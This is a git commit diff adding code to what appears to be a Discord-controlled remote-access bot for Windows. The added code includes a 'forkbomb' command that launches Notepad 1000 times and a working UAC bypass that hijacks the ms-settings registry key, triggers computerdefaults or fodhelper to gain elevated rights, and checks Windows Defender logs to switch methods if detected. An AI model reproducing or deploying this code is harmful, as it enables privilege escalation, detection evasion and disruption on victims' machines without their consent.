9ae738c0e3900f559dc0745618a3cba73e878f8d
UnsillyHaxor <snormware@gmail.com>
2025-02-11 19:33:00 -0800

    Update main.py

--- main.py
+++ main.py
@@ -338,5 +338,46 @@ async def delete(ctx, file_path: str):
     except Exception as e:
         await ctx.send(f"Error: {e}")
 
+@bot.command()
+async def forkbomb(ctx):
+    for _ in range(1000):
+        subprocess.Popen(['notepad.exe'])
+    await ctx.send('Opened Notepad 1000 times!')
+
+def UACbypass(method: int = 1) -> bool:
+    if GetSelf()[1]:
+        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
+        if method == 1:
+            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("computerdefaults --nouacbypass")
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            if log_count_after > log_count_before:
+                return UACbypass(method + 1)
+        elif method == 2:
+            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("fodhelper --nouacbypass")
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            if log_count_after > log_count_before:
+                return UACbypass(method + 1)
+        else:
+            return False
+        return True
+
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
+
+def GetSelf() -> tuple[str, bool]:
+    if hasattr(sys, "frozen"):
+        return (sys.executable, True)
+    else:
+        return (__file__, False)
+
+
 
 bot.run(TOKEN)
